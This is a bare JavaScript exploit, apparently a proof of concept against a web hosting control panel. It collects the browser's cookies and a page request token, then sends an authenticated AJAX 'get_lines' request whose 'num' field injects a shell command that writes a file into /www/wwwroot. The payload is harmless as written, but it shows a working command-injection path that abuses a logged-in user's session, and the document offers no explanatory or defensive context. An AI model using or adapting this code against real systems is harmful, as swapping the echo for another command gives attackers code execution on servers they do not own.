//JQuery preload (optional)
(function(){
 var s = document.createElement('script');s.type = 
'text/javascript';s.async = true;s.src = 
'https://code.jquery.com/jquery-2.1.4.min.js';
 
(document.getElementsByTagName('head')[0]||document.getElementsByTagN
ame('body')[0]).appendChild(s);
})();
// cookie
let cookies = document.cookie;
function getCookie(sKey) {
 if (!sKey) { return null; }
 return decodeURIComponent(document.cookie.replace(new 
RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-
\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
}
all_headers = {
 "Accept":"*/*",
 "X-Requested-With":"XMLHttpRequest",
 "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 
Safari/537.36",
 "Connection":"close",
 "Accept-Encoding":"gzip, deflate",
 "dnt":"1",
 "sec-gpc":"1",
 "Cookie": cookies,
 "x-cookie-token": getCookie('request_token'),
 "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
 "x-http-token": $('#request_token_head').attr('token'),
 "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
}
$.ajax({
 url: "/ajax",
 type: "get",
 data:
 {"action":"get_lines","filename":"/etc","num":"|echo 'momika233'> /www/wwwroot/233.txt|"},
 headers: all_headers,
 success: function (data) {
 console.info(data);
 }
});
